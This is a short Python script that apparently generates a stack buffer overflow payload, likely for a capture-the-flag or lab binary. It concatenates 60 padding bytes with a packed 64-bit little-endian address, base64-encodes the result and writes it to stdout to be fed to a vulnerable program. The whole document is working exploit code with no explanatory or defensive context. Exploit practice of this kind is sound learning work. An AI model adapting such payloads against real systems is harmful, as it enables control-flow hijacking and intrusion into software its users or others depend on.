
import sys
import struct
import base64

buf = b'iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
buf += struct.pack('<Q', 4905186578150435440)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
